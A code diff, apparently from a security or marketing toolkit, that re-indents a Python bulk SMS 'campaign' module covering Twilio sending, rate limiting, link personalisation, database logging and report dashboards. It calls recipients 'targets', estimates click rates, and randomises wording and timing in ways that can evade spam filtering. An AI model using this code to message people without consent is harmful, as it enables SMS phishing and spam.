+                print(f"{Fore.CYAN}[{i}] Target: {target['phone']} ({target['name']}){Style.RESET_ALL}")
+                print(f"    Message: {Fore.WHITE}{message[:60]}{'...' if len(message) > 60 else ''}{Style.RESET_ALL}")
+                print(f"    Status: {Fore.GREEN}SIMULATED{Style.RESET_ALL}\n")
+            
+            if len(targets) > 10:
+                print(f"{Fore.CYAN}... and {len(targets) - 10} more target(s){Style.RESET_ALL}\n")
+            
+            # Simulate statistics
+            print(f"{Fore.CYAN}Estimated Campaign Metrics:{Style.RESET_ALL}")
+            est_sent = len(targets)
+            est_delivered = int(est_sent * 0.95)  # 95% delivery rate
+            est_failed = est_sent - est_delivered
+            est_clicks = int(est_delivered * 0.15)  # 15% click rate
+            est_duration = (len(targets) / config['rate_limit']) / 60  # minutes
+            
+            print(f"  • Total Messages:  {Fore.WHITE}{est_sent}{Style.RESET_ALL}")
+            print(f"  • Est. Delivered:  {Fore.GREEN}{est_delivered} (95%){Style.RESET_ALL}")
+            print(f"  • Est. Failed:     {Fore.RED}{est_failed} (5%){Style.RESET_ALL}")
+            print(f"  • Est. Clicks:     {Fore.YELLOW}{est_clicks} (15%){Style.RESET_ALL}")
+            print(f"  • Est. Duration:   {Fore.CYAN}{est_duration:.1f} minutes{Style.RESET_ALL}")
+            print(f"  • Est. Cost:       {Fore.YELLOW}${est_sent * 0.0075:.2f} USD{Style.RESET_ALL}\n")
+            
+            print(f"{Fore.GREEN}✓ Dry run completed - no messages sent{Style.RESET_ALL}\n")
+    
+        def _schedule_sms_campaign(self, config, targets, db_conn):
+            """Schedule campaign for later execution"""
+            print(f"{Fore.CYAN}Campaign scheduled - implementation requires cron/scheduler{Style.RESET_ALL}")
+            print(f"{Fore.BLUE}ℹ Save configuration and targets for scheduled execution{Style.RESET_ALL}\n")
+    
+        def _execute_sms_campaign(self, config, targets, db_conn):
+            """Execute SMS campaign with rate limiting and error handling"""
+            import time
+            import random
+            from datetime import datetime
+            
+            results = {
+                'total_targets': len(targets),
+                'sent': 0,
+                'delivered': 0,
+                'failed': 0,
+                'errors': [],
+                'start_time': datetime.now(),
+                'messages': []
+            }
+            
+            # Initialize SMS provider client
+            client = self._initialize_sms_client(config)
+            if not client:
+                print(f"{Fore.RED}✗ ERROR: Failed to initialize SMS client{Style.RESET_ALL}")
+                return results
+            
+            # Update campaign status
+            if db_conn:
+                cursor = db_conn.cursor()
+                cursor.execute("UPDATE campaigns SET status = 'running', started_at = CURRENT_TIMESTAMP WHERE id = 1")
+                db_conn.commit()
+            
+            # Rate limiting tracking
+            messages_this_second = 0
+            second_start = time.time()
+            messages_today = 0
+            
+            # Send messages
+            batch_num = 0
+            for i, target in enumerate(targets, 1):
+                # Check daily limit
+                if messages_today >= config['daily_limit']:
+                    print(f"\n{Fore.YELLOW}⚠ WARNING: Daily limit reached ({config['daily_limit']}){Style.RESET_ALL}")
                     break
-        
-        # Display loading summary
-        print(f"\n{Fore.CYAN}Target Loading Summary:{Style.RESET_ALL}")
-        print(f"  • Valid:           {Fore.GREEN}{valid_count}{Style.RESET_ALL}")
-        if invalid_count > 0:
-            print(f"  • Invalid:         {Fore.RED}{invalid_count}{Style.RESET_ALL}")
-        if blacklisted_count > 0:
-            print(f"  • Blacklisted:     {Fore.YELLOW}{blacklisted_count}{Style.RESET_ALL}")
-        if no_opt_in_count > 0:
-            print(f"  • No Opt-in:       {Fore.YELLOW}{no_opt_in_count}{Style.RESET_ALL}")
-        print()
-        
-        return targets
-
-    def _normalize_phone_number(self, phone):
-        """Normalize phone number to E.164 format"""
-        import re
-        # Remove all non-digit characters except +
-        phone = re.sub(r'[^\d+]', '', phone)
-        # Ensure it starts with +
-        if not phone.startswith('+'):
-            phone = '+' + phone
-        return phone
-
-    def _validate_phone_number(self, phone):
-        """Validate phone number format (basic validation)"""
-        import re
-        # E.164 format: +[country code][number]
-        # Length: 7-15 digits (including country code)
-        pattern = r'^\+\d{7,15}$'
-        return bool(re.match(pattern, phone))
-
-    def _dry_run_simulation(self, config, targets, db_conn):
-        """Simulate campaign execution without sending"""
-        import time
-        import random
-        
-        print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════════════════════╗")
-        print(f"║                     DRY RUN SIMULATION                           ║")
-        print(f"╚══════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
-        
-        print(f"{Fore.YELLOW}Simulating campaign for {len(targets)} target(s)...{Style.RESET_ALL}\n")
-        
-        # Simulate message generation
-        for i, target in enumerate(targets[:10], 1):  # Show first 10
-            message = self._personalize_message(config['message'], target, config)
-            print(f"{Fore.CYAN}[{i}] Target: {target['phone']} ({target['name']}){Style.RESET_ALL}")
-            print(f"    Message: {Fore.WHITE}{message[:60]}{'...' if len(message) > 60 else ''}{Style.RESET_ALL}")
-            print(f"    Status: {Fore.GREEN}SIMULATED{Style.RESET_ALL}\n")
-        
-        if len(targets) > 10:
-            print(f"{Fore.CYAN}... and {len(targets) - 10} more target(s){Style.RESET_ALL}\n")
-        
-        # Simulate statistics
-        print(f"{Fore.CYAN}Estimated Campaign Metrics:{Style.RESET_ALL}")
-        est_sent = len(targets)
-        est_delivered = int(est_sent * 0.95)  # 95% delivery rate
-        est_failed = est_sent - est_delivered
-        est_clicks = int(est_delivered * 0.15)  # 15% click rate
-        est_duration = (len(targets) / config['rate_limit']) / 60  # minutes
-        
-        print(f"  • Total Messages:  {Fore.WHITE}{est_sent}{Style.RESET_ALL}")
-        print(f"  • Est. Delivered:  {Fore.GREEN}{est_delivered} (95%){Style.RESET_ALL}")
-        print(f"  • Est. Failed:     {Fore.RED}{est_failed} (5%){Style.RESET_ALL}")
-        print(f"  • Est. Clicks:     {Fore.YELLOW}{est_clicks} (15%){Style.RESET_ALL}")
-        print(f"  • Est. Duration:   {Fore.CYAN}{est_duration:.1f} minutes{Style.RESET_ALL}")
-        print(f"  • Est. Cost:       {Fore.YELLOW}${est_sent * 0.0075:.2f} USD{Style.RESET_ALL}\n")
-        
-        print(f"{Fore.GREEN}✓ Dry run completed - no messages sent{Style.RESET_ALL}\n")
-
-    def _schedule_sms_campaign(self, config, targets, db_conn):
-        """Schedule campaign for later execution"""
-        print(f"{Fore.CYAN}Campaign scheduled - implementation requires cron/scheduler{Style.RESET_ALL}")
-        print(f"{Fore.BLUE}ℹ Save configuration and targets for scheduled execution{Style.RESET_ALL}\n")
-
-    def _execute_sms_campaign(self, config, targets, db_conn):
-        """Execute SMS campaign with rate limiting and error handling"""
-        import time
-        import random
-        from datetime import datetime
-        
-        results = {
-            'total_targets': len(targets),
-            'sent': 0,
-            'delivered': 0,
-            'failed': 0,
-            'errors': [],
-            'start_time': datetime.now(),
-            'messages': []
-        }
-        
-        # Initialize SMS provider client
-        client = self._initialize_sms_client(config)
-        if not client:
-            print(f"{Fore.RED}✗ ERROR: Failed to initialize SMS client{Style.RESET_ALL}")
-            return results
-        
-        # Update campaign status
-        if db_conn:
-            cursor = db_conn.cursor()
-            cursor.execute("UPDATE campaigns SET status = 'running', started_at = CURRENT_TIMESTAMP WHERE id = 1")
-            db_conn.commit()
-        
-        # Rate limiting tracking
-        messages_this_second = 0
-        second_start = time.time()
-        messages_today = 0
-        
-        # Send messages
-        batch_num = 0
-        for i, target in enumerate(targets, 1):
-            # Check daily limit
-            if messages_today >= config['daily_limit']:
-                print(f"\n{Fore.YELLOW}⚠ WARNING: Daily limit reached ({config['daily_limit']}){Style.RESET_ALL}")
-                break
-            
-            # Batch control
-            if i > 1 and (i - 1) % config['batch_size'] == 0:
-                batch_num += 1
-                print(f"\n{Fore.CYAN}Batch {batch_num} completed. Waiting {config['batch_delay']}s...{Style.RESET_ALL}")
-                time.sleep(config['batch_delay'])
-                messages_this_second = 0
-                second_start = time.time()
-            
-            # Rate limiting per second
-            if messages_this_second >= config['rate_limit']:
-                elapsed = time.time() - second_start
-                if elapsed < 1.0:
-                    time.sleep(1.0 - elapsed)
-                messages_this_second = 0
-                second_start = time.time()
-            
-            # Personalize message
-            message = self._personalize_message(config['message'], target, config)
-            
-            # Send message
-            try:
-                message_result = self._send_sms_message(client, config, target, message)
                 
-                if message_result['success']:
-                    results['sent'] += 1
-                    messages_this_second += 1
-                    messages_today += 1
+                # Batch control
+                if i > 1 and (i - 1) % config['batch_size'] == 0:
+                    batch_num += 1
+                    print(f"\n{Fore.CYAN}Batch {batch_num} completed. Waiting {config['batch_delay']}s...{Style.RESET_ALL}")
+                    time.sleep(config['batch_delay'])
+                    messages_this_second = 0
+                    second_start = time.time()
+                
+                # Rate limiting per second
+                if messages_this_second >= config['rate_limit']:
+                    elapsed = time.time() - second_start
+                    if elapsed < 1.0:
+                        time.sleep(1.0 - elapsed)
+                    messages_this_second = 0
+                    second_start = time.time()
+                
+                # Personalize message
+                message = self._personalize_message(config['message'], target, config)
+                
+                # Send message
+                try:
+                    message_result = self._send_sms_message(client, config, target, message)
                     
-                    if config['real_time_stats']:
-                        print(f"{Fore.GREEN}✓ [{i}/{len(targets)}] Sent to {target['phone']}{Style.RESET_ALL}")
+                    if message_result['success']:
+                        results['sent'] += 1
+                        messages_this_second += 1
+                        messages_today += 1
+                        
+                        if config['real_time_stats']:
+                            print(f"{Fore.GREEN}✓ [{i}/{len(targets)}] Sent to {target['phone']}{Style.RESET_ALL}")
+                        
+                        # Store in database
+                        if db_conn:
+                            cursor = db_conn.cursor()
+                            cursor.execute("""
+                                INSERT INTO messages (campaign_id, phone_number, recipient_name, message_content, message_sid, status, sent_at)
+                                VALUES (1, ?, ?, ?, ?, 'sent', CURRENT_TIMESTAMP)
+                            """, (target['phone'], target['name'], message, message_result.get('sid', '')))
+                            db_conn.commit()
+                    else:
+                        results['failed'] += 1
+                        results['errors'].append({
+                            'target': target['phone'],
+                            'error': message_result.get('error', 'Unknown error')
+                        })
+                        
+                        if config['real_time_stats']:
+                            print(f"{Fore.RED}✗ [{i}/{len(targets)}] Failed to {target['phone']}: {message_result.get('error', 'Unknown')[:50]}{Style.RESET_ALL}")
                     
-                    # Store in database
-                    if db_conn:
-                        cursor = db_conn.cursor()
-                        cursor.execute("""
-                            INSERT INTO messages (campaign_id, phone_number, recipient_name, message_content, message_sid, status, sent_at)
-                            VALUES (1, ?, ?, ?, ?, 'sent', CURRENT_TIMESTAMP)
-                        """, (target['phone'], target['name'], message, message_result.get('sid', '')))
-                        db_conn.commit()
-                else:
+                    results['messages'].append(message_result)
+                    
+                except Exception as e:
                     results['failed'] += 1
                     results['errors'].append({
                         'target': target['phone'],
-                        'error': message_result.get('error', 'Unknown error')
+                        'error': str(e)
                     })
-                    
-                    if config['real_time_stats']:
-                        print(f"{Fore.RED}✗ [{i}/{len(targets)}] Failed to {target['phone']}: {message_result.get('error', 'Unknown')[:50]}{Style.RESET_ALL}")
+                    print(f"{Fore.RED}✗ Exception sending to {target['phone']}: {str(e)}{Style.RESET_ALL}")
                 
-                results['messages'].append(message_result)
+                # Add delay between messages
+                delay = config['delay']
+                if config['randomize_delay']:
+                    delay = delay * random.uniform(0.5, 1.5)
+                time.sleep(delay)
+            
+            # Update campaign completion
+            if db_conn:
+                cursor = db_conn.cursor()
+                cursor.execute("""
+                    UPDATE campaigns 
+                    SET status = 'completed', completed_at = CURRENT_TIMESTAMP, 
+                        total_targets = ?, total_sent = ?, total_failed = ?
+                    WHERE id = 1
+                """, (results['total_targets'], results['sent'], results['failed']))
+                db_conn.commit()
+            
+            results['end_time'] = datetime.now()
+            results['duration'] = (results['end_time'] - results['start_time']).total_seconds()
+            
+            return results
+    
+        def _initialize_sms_client(self, config):
+            """Initialize SMS provider client based on configuration"""
+            provider = config['provider']
+            
+            try:
+                if provider == 'twilio':
+                    from twilio.rest import Client
+                    return Client(config['twilio_sid'], config['twilio_token'])
+                
+                elif provider == 'vonage':
+                    # Vonage implementation would go here
+                    print(f"{Fore.YELLOW}⚠ Vonage provider not yet implemented{Style.RESET_ALL}")
+                    return None
+                
+                elif provider == 'aws_sns':
+                    # AWS SNS implementation would go here
+                    print(f"{Fore.YELLOW}⚠ AWS SNS provider not yet implemented{Style.RESET_ALL}")
+                    return None
+                
+                else:
+                    print(f"{Fore.YELLOW}⚠ Manual mode - no client initialization{Style.RESET_ALL}")
+                    return "manual"
+            
+            except ImportError as e:
+                print(f"{Fore.RED}✗ ERROR: Required library not installed: {str(e)}{Style.RESET_ALL}")
+                return None
+            except Exception as e:
+                print(f"{Fore.RED}✗ ERROR: Client initialization failed: {str(e)}{Style.RESET_ALL}")
+                return None
+    
+        def _personalize_message(self, message, target, config):
+            """Personalize message with target-specific variables"""
+            import random
+            
+            # Replace standard variables
+            personalized = message.replace('{name}', target['name'])
+            personalized = personalized.replace('{phone}', target['phone'])
+            personalized = personalized.replace('{country}', target.get('country', ''))
+            personalized = personalized.replace('{link}', config['link'])
+            personalized = personalized.replace('{random}', str(random.randint(100000, 999999)))
+            personalized = personalized.replace('{sender}', config['sender'])
+            
+            # Add randomization if enabled
+            if config.get('randomize_content'):
+                variations = [
+                    ('!', '.'),
+                    (' now', ' immediately'),
+                    ('urgent', 'important'),
+                    ('Click', 'Tap'),
+                    ('Visit', 'Check')
+                ]
+                for old, new in variations:
+                    if random.choice([True, False]):
+                        personalized = personalized.replace(old, new)
+            
+            return personalized
+    
+        def _send_sms_message(self, client, config, target, message):
+            """Send SMS message via configured provider"""
+            result = {
+                'success': False,
+                'target': target['phone'],
+                'message': message,
+                'sid': None,
+                'error': None,
+                'timestamp': None
+            }
+            
+            try:
+                if config['provider'] == 'twilio':
+                    # Send via Twilio
+                    msg = client.messages.create(
+                        body=message,
+                        from_=config['twilio_number'],
+                        to=target['phone']
+                    )
+                    result['success'] = True
+                    result['sid'] = msg.sid
+                    result['timestamp'] = msg.date_created
+                
+                elif config['provider'] == 'manual':
+                    # Manual mode - just simulate
+                    result['success'] = True
+                    result['sid'] = f"MANUAL_{target['phone']}"
+                    import datetime
+                    result['timestamp'] = datetime.datetime.now()
+                
+                else:
+                    result['error'] = f"Provider {config['provider']} not implemented"
+            
+            except Exception as e:
+                result['error'] = str(e)
+            
+            return result
+    
+        def _display_sms_results(self, results, config):
+            """Display campaign execution results"""
+            print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════════════════════╗")
+            print(f"║                       CAMPAIGN RESULTS                           ║")
+            print(f"╚══════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
+            
+            # Calculate metrics
+            success_rate = (results['sent'] / results['total_targets'] * 100) if results['total_targets'] > 0 else 0
+            failure_rate = (results['failed'] / results['total_targets'] * 100) if results['total_targets'] > 0 else 0
+            
+            print(f"{Fore.YELLOW}  Campaign Statistics:{Style.RESET_ALL}")
+            print(f"    • Total Targets:   {Fore.WHITE}{results['total_targets']}{Style.RESET_ALL}")
+            print(f"    • Successfully Sent: {Fore.GREEN}{results['sent']} ({success_rate:.1f}%){Style.RESET_ALL}")
+            print(f"    • Failed:          {Fore.RED}{results['failed']} ({failure_rate:.1f}%){Style.RESET_ALL}")
+            print(f"    • Duration:        {Fore.CYAN}{results.get('duration', 0):.1f} seconds{Style.RESET_ALL}")
+            
+            if results['failed'] > 0 and len(results['errors']) > 0:
+                print(f"\n{Fore.YELLOW}  Error Summary (first 5):{Style.RESET_ALL}")
+                for i, error in enumerate(results['errors'][:5], 1):
+                    print(f"    {i}. {error['target']}: {Fore.RED}{error['error'][:60]}{Style.RESET_ALL}")
+            
+            print(f"\n{Fore.CYAN}{'=' * 70}{Style.RESET_ALL}\n")
+    
+        def _generate_sms_reports(self, results, config, db_conn):
+            """Generate comprehensive campaign reports"""
+            import time
+            import json
+            
+            timestamp = int(time.time())
+            report_files = {}
+            
+            try:
+                # CSV Report
+                if config['output_format'] in ['csv', 'all']:
+                    csv_file = f"{config['report_file']}_{timestamp}.csv"
+                    with open(csv_file, 'w') as f:
+                        f.write("Phone,Name,Status,Message,Timestamp\n")
+                        for msg in results['messages']:
+                            f.write(f"{msg['target']},,{'sent' if msg['success'] else 'failed'},{msg['message'][:50]},{msg.get('timestamp', '')}\n")
+                    report_files['csv'] = csv_file
+                
+                # JSON Report
+                if config['output_format'] in ['json', 'all']:
+                    json_file = f"{config['report_file']}_{timestamp}.json"
+                    report_data = {
+                        'campaign': config['campaign_name'],
+                        'timestamp': timestamp,
+                        'statistics': {
+                            'total': results['total_targets'],
+                            'sent': results['sent'],
+                            'failed': results['failed'],
+                            'duration': results.get('duration', 0)
+                        },
+                        'messages': results['messages'][:100]  # Limit to first 100
+                    }
+                    with open(json_file, 'w') as f:
+                        json.dump(report_data, f, indent=2, default=str)
+                    report_files['json'] = json_file
+                
+                # HTML Dashboard
+                if config['output_format'] in ['html', 'all'] and config['generate_dashboard']:
+                    html_file = self._generate_sms_dashboard(results, config, db_conn, timestamp)
+                    if html_file:
+                        report_files['html'] = html_file
                 
             except Exception as e:
-                results['failed'] += 1
-                results['errors'].append({
-                    'target': target['phone'],
-                    'error': str(e)
-                })
-                print(f"{Fore.RED}✗ Exception sending to {target['phone']}: {str(e)}{Style.RESET_ALL}")
+                print(f"{Fore.RED}✗ ERROR: Report generation failed: {str(e)}{Style.RESET_ALL}")
             
-            # Add delay between messages
-            delay = config['delay']
-            if config['randomize_delay']:
-                delay = delay * random.uniform(0.5, 1.5)
-            time.sleep(delay)
-        
-        # Update campaign completion
-        if db_conn:
-            cursor = db_conn.cursor()
-            cursor.execute("""
-                UPDATE campaigns 
-                SET status = 'completed', completed_at = CURRENT_TIMESTAMP, 
-                    total_targets = ?, total_sent = ?, total_failed = ?
-                WHERE id = 1
-            """, (results['total_targets'], results['sent'], results['failed']))
-            db_conn.commit()
-        
-        results['end_time'] = datetime.now()
-        results['duration'] = (results['end_time'] - results['start_time']).total_seconds()
-        
-        return results
-
-    def _initialize_sms_client(self, config):
-        """Initialize SMS provider client based on configuration"""
-        provider = config['provider']
-        
-        try:
-            if provider == 'twilio':
-                from twilio.rest import Client
-                return Client(config['twilio_sid'], config['twilio_token'])
+            return report_files
+    
+        def _generate_sms_dashboard(self, results, config, db_conn, timestamp):
+            """Generate HTML analytics dashboard"""
+            success_rate = (results['sent'] / results['total_targets'] * 100) if results['total_targets'] > 0 else 0
             
-            elif provider == 'vonage':
-                # Vonage implementation would go here
-                print(f"{Fore.YELLOW}⚠ Vonage provider not yet implemented{Style.RESET_ALL}")
-                return None
+            html_content = f"""<!DOCTYPE html>
+    <html>
+    <head>
+        <title>SMS Campaign Dashboard - {config['campaign_name']}</title>
+        <meta charset="UTF-8">
+        <style>
+            body {{
+                font-family: 'Segoe UI', Tahoma, sans-serif;
+                background: #f5f5f5;
+                margin: 0;
+                padding: 20px;
+            }}
+            .dashboard {{
+                max-width: 1200px;
+                margin: 0 auto;
+                background: white;
+                border-radius: 8px;
+                padding: 30px;
+                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            }}
+            h1 {{
+                color: #333;
+                border-bottom: 3px solid #00AFF0;
+                padding-bottom: 10px;
+            }}
+            .stats {{
+                display: grid;
+                grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+                gap: 20px;
+                margin: 30px 0;
+            }}
+            .stat-card {{
+                background: linear-gradient(135deg, #00AFF0 0%, #0078D4 100%);
+                color: white;
+                padding: 20px;
+                border-radius: 8px;
+                text-align: center;
+            }}
+            .stat-value {{
+                font-size: 36px;
+                font-weight: bold;
+                margin: 10px 0;
+            }}
+            .stat-label {{
+                font-size: 14px;
+                opacity: 0.9;
+            }}
+            table {{
+                width: 100%;
+                border-collapse: collapse;
+                margin-top: 20px;
+            }}
+            th, td {{
+                padding: 12px;
+                text-align: left;
+                border-bottom: 1px solid #ddd;
+            }}
+            th {{
+                background: #00AFF0;
+                color: white;
+            }}
+            tr:hover {{
+                background: #f5f5f5;
+            }}
+            .success {{ color: #4CAF50; }}
+            .failed {{ color: #f44336; }}
+        </style>
+    </head>
+    <body>
+        <div class="dashboard">
+            <h1>📱 SMS Campaign Dashboard: {config['campaign_name']}</h1>
             
-            elif provider == 'aws_sns':
-                # AWS SNS implementation would go here
-                print(f"{Fore.YELLOW}⚠ AWS SNS provider not yet implemented{Style.RESET_ALL}")
-                return None
-            
-            else:
-                print(f"{Fore.YELLOW}⚠ Manual mode - no client initialization{Style.RESET_ALL}")
-                return "manual"
-        
-        except ImportError as e:
-            print(f"{Fore.RED}✗ ERROR: Required library not installed: {str(e)}{Style.RESET_ALL}")
-            return None
-        except Exception as e:
-            print(f"{Fore.RED}✗ ERROR: Client initialization failed: {str(e)}{Style.RESET_ALL}")
-            return None
-
-    def _personalize_message(self, message, target, config):
-        """Personalize message with target-specific variables"""
-        import random
-        
-        # Replace standard variables
-        personalized = message.replace('{name}', target['name'])
-        personalized = personalized.replace('{phone}', target['phone'])
-        personalized = personalized.replace('{country}', target.get('country', ''))
-        personalized = personalized.replace('{link}', config['link'])
-        personalized = personalized.replace('{random}', str(random.randint(100000, 999999)))
-        personalized = personalized.replace('{sender}', config['sender'])
-        
-        # Add randomization if enabled
-        if config.get('randomize_content'):
-            variations = [
-                ('!', '.'),
-                (' now', ' immediately'),
-                ('urgent', 'important'),
-                ('Click', 'Tap'),
-                ('Visit', 'Check')
-            ]
-            for old, new in variations:
-                if random.choice([True, False]):
-                    personalized = personalized.replace(old, new)
-        
-        return personalized
-
-    def _send_sms_message(self, client, config, target, message):
-        """Send SMS message via configured provider"""
-        result = {
-            'success': False,
-            'target': target['phone'],
-            'message': message,
-            'sid': None,
-            'error': None,
-            'timestamp': None
-        }
-        
-        try:
-            if config['provider'] == 'twilio':
-                # Send via Twilio
-                msg = client.messages.create(
-                    body=message,
-                    from_=config['twilio_number'],
-                    to=target['phone']
-                )
-                result['success'] = True
-                result['sid'] = msg.sid
-                result['timestamp'] = msg.date_created
-            
-            elif config['provider'] == 'manual':
-                # Manual mode - just simulate
-                result['success'] = True
-                result['sid'] = f"MANUAL_{target['phone']}"
-                import datetime
-                result['timestamp'] = datetime.datetime.now()
-            
-            else:
-                result['error'] = f"Provider {config['provider']} not implemented"
-        
-        except Exception as e:
-            result['error'] = str(e)
-        
-        return result
-
-    def _display_sms_results(self, results, config):
-        """Display campaign execution results"""
-        print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════════════════════╗")
-        print(f"║                       CAMPAIGN RESULTS                           ║")
-        print(f"╚══════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
-        
-        # Calculate metrics
-        success_rate = (results['sent'] / results['total_targets'] * 100) if results['total_targets'] > 0 else 0
-        failure_rate = (results['failed'] / results['total_targets'] * 100) if results['total_targets'] > 0 else 0
-        
-        print(f"{Fore.YELLOW}  Campaign Statistics:{Style.RESET_ALL}")
-        print(f"    • Total Targets:   {Fore.WHITE}{results['total_targets']}{Style.RESET_ALL}")
-        print(f"    • Successfully Sent: {Fore.GREEN}{results['sent']} ({success_rate:.1f}%){Style.RESET_ALL}")
-        print(f"    • Failed:          {Fore.RED}{results['failed']} ({failure_rate:.1f}%){Style.RESET_ALL}")
-        print(f"    • Duration:        {Fore.CYAN}{results.get('duration', 0):.1f} seconds{Style.RESET_ALL}")
-        
-        if results['failed'] > 0 and len(results['errors']) > 0:
-            print(f"\n{Fore.YELLOW}  Error Summary (first 5):{Style.RESET_ALL}")
-            for i, error in enumerate(results['errors'][:5], 1):
-                print(f"    {i}. {error['target']}: {Fore.RED}{error['error'][:60]}{Style.RESET_ALL}")
-        
-        print(f"\n{Fore.CYAN}{'=' * 70}{Style.RESET_ALL}\n")
-
-    def _generate_sms_reports(self, results, config, db_conn):
-        """Generate comprehensive campaign reports"""
-        import time
-        import json
-        
-        timestamp = int(time.time())
-        report_files = {}
-        
-        try:
-            # CSV Report
-            if config['output_format'] in ['csv', 'all']:
-                csv_file = f"{config['report_file']}_{timestamp}.csv"
-                with open(csv_file, 'w') as f:
-                    f.write("Phone,Name,Status,Message,Timestamp\n")
-                    for msg in results['messages']:
-                        f.write(f"{msg['target']},,{'sent' if msg['success'] else 'failed'},{msg['message'][:50]},{msg.get('timestamp', '')}\n")
-                report_files['csv'] = csv_file
-            
-            # JSON Report
-            if config['output_format'] in ['json', 'all']:
-                json_file = f"{config['report_file']}_{timestamp}.json"
-                report_data = {
-                    'campaign': config['campaign_name'],
-                    'timestamp': timestamp,
-                    'statistics': {
-                        'total': results['total_targets'],
-                        'sent': results['sent'],
-                        'failed': results['failed'],
-                        'duration': results.get('duration', 0)
-                    },
-                    'messages': results['messages'][:100]  # Limit to first 100
-                }
-                with open(json_file, 'w') as f:
-                    json.dump(report_data, f, indent=2, default=str)
-                report_files['json'] = json_file
-            
-            # HTML Dashboard
-            if config['output_format'] in ['html', 'all'] and config['generate_dashboard']:
-                html_file = self._generate_sms_dashboard(results, config, db_conn, timestamp)
-                if html_file:
-                    report_files['html'] = html_file
-            
-        except Exception as e:
-            print(f"{Fore.RED}✗ ERROR: Report generation failed: {str(e)}{Style.RESET_ALL}")
-        
-        return report_files
-
-    def _generate_sms_dashboard(self, results, config, db_conn, timestamp):
-        """Generate HTML analytics dashboard"""
-        success_rate = (results['sent'] / results['total_targets'] * 100) if results['total_targets'] > 0 else 0
-        
-        html_content = f"""<!DOCTYPE html>
-<html>
-<head>
-    <title>SMS Campaign Dashboard - {config['campaign_name']}</title>
-    <meta charset="UTF-8">
-    <style>
-        body {{
-            font-family: 'Segoe UI', Tahoma, sans-serif;
-            background: #f5f5f5;
-            margin: 0;
-            padding: 20px;
-        }}
-        .dashboard {{
-            max-width: 1200px;
-            margin: 0 auto;
-            background: white;
-            border-radius: 8px;
-            padding: 30px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-        }}
-        h1 {{
-            color: #333;
-            border-bottom: 3px solid #00AFF0;
-            padding-bottom: 10px;
-        }}
-        .stats {{
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 20px;
-            margin: 30px 0;
-        }}
-        .stat-card {{
-            background: linear-gradient(135deg, #00AFF0 0%, #0078D4 100%);
-            color: white;
-            padding: 20px;
-            border-radius: 8px;
-            text-align: center;
-        }}
-        .stat-value {{
-            font-size: 36px;
-            font-weight: bold;
-            margin: 10px 0;
-        }}
-        .stat-label {{
-            font-size: 14px;
-            opacity: 0.9;
-        }}
-        table {{
-            width: 100%;
-            border-collapse: collapse;
-            margin-top: 20px;
-        }}
-        th, td {{
-            padding: 12px;
-            text-align: left;
-            border-bottom: 1px solid #ddd;
-        }}
-        th {{
-            background: #00AFF0;
-            color: white;
-        }}
-        tr:hover {{
-            background: #f5f5f5;
-        }}
-        .success {{ color: #4CAF50; }}
-        .failed {{ color: #f44336; }}
-    </style>
-</head>
-<body>
-    <div class="dashboard">
-        <h1>📱 SMS Campaign Dashboard: {config['campaign_name']}</h1>
-        
-        <div class="stats">
-            <div class="stat-card">
-                <div class="stat-label">Total Targets</div>
-                <div class="stat-value">{results['total_targets']}</div>
+            <div class="stats">
+                <div class="stat-card">
+                    <div class="stat-label">Total Targets</div>
+                    <div class="stat-value">{results['total_targets']}</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-label">Successfully Sent</div>
+                    <div class="stat-value">{results['sent']}</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-label">Failed</div>
+                    <div class="stat-value">{results['failed']}</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-label">Success Rate</div>
+                    <div class="stat-value">{success_rate:.1f}%</div>
+                </div>
             </div>
-            <div class="stat-card">
-                <div class="stat-label">Successfully Sent</div>
-                <div class="stat-value">{results['sent']}</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-label">Failed</div>
-                <div class="stat-value">{results['failed']}</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-label">Success Rate</div>
-                <div class="stat-value">{success_rate:.1f}%</div>
-            </div>
+            
+            <h2>Campaign Details</h2>
+            <table>
+                <tr>
+                    <th>Setting</th>
+                    <th>Value</th>
+                </tr>
+                <tr><td>Provider</td><td>{config['provider'].upper()}</td></tr>
+                <tr><td>Sender</td><td>{config['sender']}</td></tr>
+                <tr><td>Template</td><td>{config['template']}</td></tr>
+                <tr><td>Duration</td><td>{results.get('duration', 0):.1f} seconds</td></tr>
+                <tr><td>Rate Limit</td><td>{config['rate_limit']} msg/sec</td></tr>
+            </table>
+            
+            <h2>Recent Messages (First 20)</h2>
+            <table>
+                <tr>
+                    <th>Phone</th>
+                    <th>Message</th>
+                    <th>Status</th>
+                    <th>SID</th>
+                </tr>
+                {''.join([f"<tr><td>{m['target']}</td><td>{m['message'][:40]}...</td><td class=\"{'success' if m['success'] else 'failed'}\">{'✓ Sent' if m['success'] else '✗ Failed'}</td><td>{m.get('sid', 'N/A')[:20]}</td></tr>" for m in results['messages'][:20]])}
+            </table>
         </div>
-        
-        <h2>Campaign Details</h2>
-        <table>
-            <tr>
-                <th>Setting</th>
-                <th>Value</th>
-            </tr>
-            <tr><td>Provider</td><td>{config['provider'].upper()}</td></tr>
-            <tr><td>Sender</td><td>{config['sender']}</td></tr>
-            <tr><td>Template</td><td>{config['template']}</td></tr>
-            <tr><td>Duration</td><td>{results.get('duration', 0):.1f} seconds</td></tr>
-            <tr><td>Rate Limit</td><td>{config['rate_limit']} msg/sec</td></tr>
-        </table>
-        
-        <h2>Recent Messages (First 20)</h2>
-        <table>
-            <tr>
-                <th>Phone</th>
-                <th>Message</th>
-                <th>Status</th>
-                <th>SID</th>
-            </tr>
-            {''.join([f"<tr><td>{m['target']}</td><td>{m['message'][:40]}...</td><td class=\"{'success' if m['success'] else 'failed'}\">{'✓ Sent' if m['success'] else '✗ Failed'}</td><td>{m.get('sid', 'N/A')[:20]}</td></tr>" for m in results['messages'][:20]])}
-        </table>
-    </div>
-</body>
-</html>"""
-        
-        filename = f"sms_dashboard_{timestamp}.html"
-        try:
